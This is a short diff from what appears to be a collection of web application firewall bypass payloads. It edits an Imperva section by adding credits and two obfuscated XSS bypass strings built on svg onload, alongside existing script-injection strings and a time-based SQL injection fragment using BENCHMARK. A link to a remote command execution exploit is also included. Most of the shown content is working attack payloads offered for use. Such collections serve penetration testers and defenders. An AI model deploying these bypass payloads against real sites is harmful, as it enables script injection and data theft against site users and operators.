@@ -2897,10 +2897,15 @@ state=%2527+and+
 BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
 ```
 
-### Imperva SecureSphere
+### Imperva
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
-- XSS Bypass by [@Alra3ees](https://twitter.com/alra3ees)
+- XSS Bypass by [@David Y](https://twitter.com/daveysec)
 ```
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+```
+- XSS Bypass by [@Emad Shanab](https://twitter.com/alra3ees)
+```
+<svg/onload=self[`aler`%2b`t`]`1`>
 anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
